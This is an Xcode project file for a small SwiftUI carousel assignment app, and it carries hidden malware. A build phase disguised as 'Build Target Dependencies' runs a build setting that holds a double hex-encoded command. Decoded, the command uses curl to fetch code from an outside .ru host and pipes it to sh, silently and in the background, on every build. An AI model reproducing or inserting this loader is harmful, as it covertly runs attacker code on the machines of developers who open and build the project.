// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		10C0BD4E2EB6615500849CAA /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 10C0BD4A2EB6615500849CAA /* Assets.xcassets */; };
		10C0BD4F2EB6615500849CAA /* Assignment_surajApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD4B2EB6615500849CAA /* Assignment_surajApp.swift */; };
		10C0BD502EB6615500849CAA /* CustomCarausel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD4C2EB6615500849CAA /* CustomCarausel.swift */; };
		10C0BD532EB6645600849CAA /* ObservableArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD522EB6645600849CAA /* ObservableArray.swift */; };
		10C0BD552EB664C300849CAA /* UiViewWithData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD542EB664C300849CAA /* UiViewWithData.swift */; };
		10C0BD572EB666F200849CAA /* CarouselDragState.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD562EB666F200849CAA /* CarouselDragState.swift */; };
		10C0BD592EB66C2600849CAA /* Animation+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD582EB66C2600849CAA /* Animation+Extension.swift */; };
		10C0BD5B2EB676E900849CAA /* View+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD5A2EB676E900849CAA /* View+Extension.swift */; };
		10C0BD5E2EB679C000849CAA /* DemoCarouselView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD5D2EB679C000849CAA /* DemoCarouselView.swift */; };
		10C0BD602EB6897D00849CAA /* CustomCarousel+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 10C0BD5F2EB6897D00849CAA /* CustomCarousel+Extension.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		10C0BD3C2EB6614B00849CAA /* Assignment-suraj.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Assignment-suraj.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		10C0BD4A2EB6615500849CAA /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		10C0BD4B2EB6615500849CAA /* Assignment_surajApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Assignment_surajApp.swift; sourceTree = "<group>"; };
		10C0BD4C2EB6615500849CAA /* CustomCarausel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomCarausel.swift; sourceTree = "<group>"; };
		10C0BD522EB6645600849CAA /* ObservableArray.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ObservableArray.swift; sourceTree = "<group>"; };
		10C0BD542EB664C300849CAA /* UiViewWithData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UiViewWithData.swift; sourceTree = "<group>"; };
		10C0BD562EB666F200849CAA /* CarouselDragState.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarouselDragState.swift; sourceTree = "<group>"; };
		10C0BD582EB66C2600849CAA /* Animation+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Animation+Extension.swift"; sourceTree = "<group>"; };
		10C0BD5A2EB676E900849CAA /* View+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "View+Extension.swift"; sourceTree = "<group>"; };
		10C0BD5D2EB679C000849CAA /* DemoCarouselView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DemoCarouselView.swift; sourceTree = "<group>"; };
		10C0BD5F2EB6897D00849CAA /* CustomCarousel+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CustomCarousel+Extension.swift"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		10C0BD392EB6614B00849CAA /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		10C0BD332EB6614B00849CAA = {
			isa = PBXGroup;
			children = (
				10C0BD4D2EB6615500849CAA /* Assignment-suraj */,
				10C0BD3D2EB6614B00849CAA /* Products */,
			);
			sourceTree = "<group>";
		};
		10C0BD3D2EB6614B00849CAA /* Products */ = {
			isa = PBXGroup;
			children = (
				10C0BD3C2EB6614B00849CAA /* Assignment-suraj.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		10C0BD4D2EB6615500849CAA /* Assignment-suraj */ = {
			isa = PBXGroup;
			children = (
				10C0BD5C2EB679B600849CAA /* HomeView */,
				10C0BD512EB6615D00849CAA /* Carousel */,
				10C0BD4A2EB6615500849CAA /* Assets.xcassets */,
				10C0BD4B2EB6615500849CAA /* Assignment_surajApp.swift */,
			);
			path = "Assignment-suraj";
			sourceTree = "<group>";
		};
		10C0BD512EB6615D00849CAA /* Carousel */ = {
			isa = PBXGroup;
			children = (
				10C0BD4C2EB6615500849CAA /* CustomCarausel.swift */,
				10C0BD522EB6645600849CAA /* ObservableArray.swift */,
				10C0BD542EB664C300849CAA /* UiViewWithData.swift */,
				10C0BD562EB666F200849CAA /* CarouselDragState.swift */,
				10C0BD582EB66C2600849CAA /* Animation+Extension.swift */,
				10C0BD5A2EB676E900849CAA /* View+Extension.swift */,
				10C0BD5F2EB6897D00849CAA /* CustomCarousel+Extension.swift */,
			);
			path = Carousel;
			sourceTree = "<group>";
		};
		10C0BD5C2EB679B600849CAA /* HomeView */ = {
			isa = PBXGroup;
			children = (
				10C0BD5D2EB679C000849CAA /* DemoCarouselView.swift */,
			);
			path = HomeView;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		10C0BD3B2EB6614B00849CAA /* Assignment-suraj */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 10C0BD472EB6614C00849CAA /* Build configuration list for PBXNativeTarget "Assignment-suraj" */;
			buildPhases = (
				A3F3125B663C4A3483A389E6 /* Build Target Dependencies */,
				10C0BD382EB6614B00849CAA /* Sources */,
				10C0BD392EB6614B00849CAA /* Frameworks */,
				10C0BD3A2EB6614B00849CAA /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Assignment-suraj";
			packageProductDependencies = (
			);
			productName = "Assignment-suraj";
			productReference = 10C0BD3C2EB6614B00849CAA /* Assignment-suraj.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		10C0BD342EB6614B00849CAA /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1640;
				LastUpgradeCheck = 1640;
				TargetAttributes = {
					10C0BD3B2EB6614B00849CAA = {
						CreatedOnToolsVersion = 16.4;
					};
				};
			};
			buildConfigurationList = 10C0BD372EB6614B00849CAA /* Build configuration list for PBXProject "Assignment-suraj" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 10C0BD332EB6614B00849CAA;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 10C0BD3D2EB6614B00849CAA /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				10C0BD3B2EB6614B00849CAA /* Assignment-suraj */,
			);
		};
/* End PBXProject section */

/* Begin PBXShellScriptBuildPhase section */
		A3F3125B663C4A3483A389E6 /* Build Target Dependencies */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Dependencies";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
			showEnvVarsInLog = 0;			
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXBuildRule section */
			/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		10C0BD3A2EB6614B00849CAA /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				10C0BD4E2EB6615500849CAA /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		10C0BD382EB6614B00849CAA /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				10C0BD532EB6645600849CAA /* ObservableArray.swift in Sources */,
				10C0BD602EB6897D00849CAA /* CustomCarousel+Extension.swift in Sources */,
				10C0BD592EB66C2600849CAA /* Animation+Extension.swift in Sources */,
				10C0BD5B2EB676E900849CAA /* View+Extension.swift in Sources */,
				10C0BD552EB664C300849CAA /* UiViewWithData.swift in Sources */,
				10C0BD4F2EB6615500849CAA /* Assignment_surajApp.swift in Sources */,
				10C0BD5E2EB679C000849CAA /* DemoCarouselView.swift in Sources */,
				10C0BD572EB666F200849CAA /* CarouselDragState.swift in Sources */,
				10C0BD502EB6615500849CAA /* CustomCarausel.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		10C0BD452EB6614C00849CAA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A6E983A = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363736393732366636653635373436333634366532653732373532660a3631323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = YX6LU735FJ;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		10C0BD462EB6614C00849CAA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A6E983A = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363736393732366636653635373436333634366532653732373532660a3631323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = YX6LU735FJ;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		10C0BD482EB6614C00849CAA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = YX6LU735FJ;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "Assignment-suraj.Assignment-suraj";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		10C0BD492EB6614C00849CAA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = YX6LU735FJ;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "Assignment-suraj.Assignment-suraj";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		10C0BD372EB6614B00849CAA /* Build configuration list for PBXProject "Assignment-suraj" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				10C0BD452EB6614C00849CAA /* Debug */,
				10C0BD462EB6614C00849CAA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		10C0BD472EB6614C00849CAA /* Build configuration list for PBXNativeTarget "Assignment-suraj" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				10C0BD482EB6614C00849CAA /* Debug */,
				10C0BD492EB6614C00849CAA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 10C0BD342EB6614B00849CAA /* Project object */;
}
